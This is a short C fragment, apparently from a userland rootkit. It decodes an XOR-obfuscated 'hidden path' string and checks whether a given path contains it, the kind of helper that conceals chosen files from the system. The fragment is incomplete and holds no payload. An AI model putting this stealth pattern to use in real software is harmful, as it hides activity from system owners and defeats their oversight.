#include <string.h> 
#include <stdio.h> 

int check_if_hidden_path(const char *path) {
    char *hidden_path_str = strdup(HIDDEN_PATH_STR); xor(hidden_path_str);
    if ((strstr(path, hidden_path_str)) != NULL) {
        CLEAN(hidden_path_str);
        return 1;
    }
    CLEAN(hidden_path_str);
    return 0;
}